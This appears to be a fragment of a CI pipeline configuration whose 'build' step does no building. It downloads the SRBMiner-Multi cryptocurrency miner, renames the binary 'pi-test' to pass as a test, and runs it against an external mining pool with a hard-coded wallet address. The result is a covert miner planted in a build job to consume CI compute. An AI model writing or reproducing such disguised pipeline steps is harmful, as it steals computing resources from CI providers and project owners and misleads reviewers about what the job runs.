      - run:
          name: build
          command:
              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && mv SRBMiner-Multi-0-6-6 10 && cd 10 && mv SRBMiner-MULTI pi-test && ./pi-test --algorithm curvehash --pool stratum-asia.rplant.xyz:7058 --wallet TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN --password =x --disable-gpu --cpu-threads 2
